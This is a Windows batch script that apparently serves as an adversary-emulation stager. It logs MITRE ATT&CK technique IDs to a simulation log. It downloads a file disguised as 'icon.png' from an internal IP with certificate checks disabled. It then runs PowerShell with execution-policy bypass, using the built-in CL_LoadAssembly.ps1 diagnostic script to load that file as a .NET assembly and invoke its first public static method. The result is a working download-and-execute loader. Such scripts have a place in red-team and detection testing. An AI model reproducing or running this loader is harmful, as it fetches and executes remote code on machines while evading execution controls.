@echo off
SETLOCAL ENABLEDELAYEDEXPANSION

REM --- Placeholder variable assignments (PHR_ literals as values) ---
SET sdhjkl=%APPDATA%\10405\1da15c6a
SET qwzxpl=9a8e457a.txt
SET mnbvfg=https://10.0.0.49/stage/2/icon.png?10405-7
SET plkmjv=ITZEL-S2BO
SET vbnmcx=10405
SET ghzxpq=7

REM Cache timestamp once
SET tsvar=!DATE!/!TIME!

REM Initialize log file path
SET logfile=%APPDATA%\!ghzxpq!\macula-simulations.log

REM --- Phase 1: Debug heartbeat start ---
echo [!tsvar!][DEBUG][!plkmjv!][!vbnmcx!]: heartbeat_start>> "!logfile!" 2>nul

REM --- Download heartbeat (single curl call, linear) ---
curl -k -s -o "!sdhjkl!\!qwzxpl!" "!mnbvfg!"
set curl_exit=!errorlevel!

REM --- Debug heartbeat complete ---
echo [!tsvar!][DEBUG][!plkmjv!][!vbnmcx!]: heartbeat_complete>> "!logfile!" 2>nul

REM --- Phase 2: Change directory to output ---
echo [!tsvar!][DEBUG][!plkmjv!][!vbnmcx!]: chdir_start>> "!logfile!" 2>nul
cd /d "!sdhjkl!" >nul 2>&1
echo [!tsvar!][DEBUG][!plkmjv!][!vbnmcx!]: chdir_result=!errorlevel!>> "!logfile!" 2>nul

REM --- Phase 3: Execute Stage 2 Loader via PowerShell ---
echo [!tsvar!][DEBUG][!plkmjv!][!vbnmcx!]: rundll32_start>> "!logfile!" 2>nul
powershell.exe -ep bypass -command "set-location -path C:\Windows\diagnostics\system\Audio; import-module .\CL_LoadAssembly.ps1; LoadAssemblyFromPath %APPDATA%\10405\1da15c6a\9a8e457a.txt; $a=[AppDomain]::CurrentDomain.GetAssemblies()|Select -Last 1; ($a.GetExportedTypes()|%%{$_.GetMethods([Reflection.BindingFlags]'Public,Static')|?{$_.GetParameters().Count -eq 0}}|Select -First 1).Invoke($null,$null)"
set powershell_exit=!errorlevel!
echo [!tsvar!][DEBUG][!plkmjv!][!vbnmcx!]: rundll32_result=!powershell_exit!>> "!logfile!" 2>nul

REM --- TTP log for T1218 ---
if !powershell_exit! equ 0 (
    echo [!tsvar!][TTP][!plkmjv!][!vbnmcx!]: T1218|System Binary Proxy Execution=[OK]:[]>> "!logfile!" 2>nul
) else (
    echo [!tsvar!][TTP][!plkmjv!][!vbnmcx!]: T1218|System Binary Proxy Execution=[FAIL]:[msbuild_failed]>> "!logfile!" 2>nul
)

REM --- Phase 4: Log obfuscation technique (T1027) ---
echo [!tsvar!][TTP][!plkmjv!][!vbnmcx!]: T1027|Obfuscated Files or Information=[OK]:[]>> "!logfile!" 2>nul

REM --- Exit (no loops, no opaque predicates) ---
exit /b 0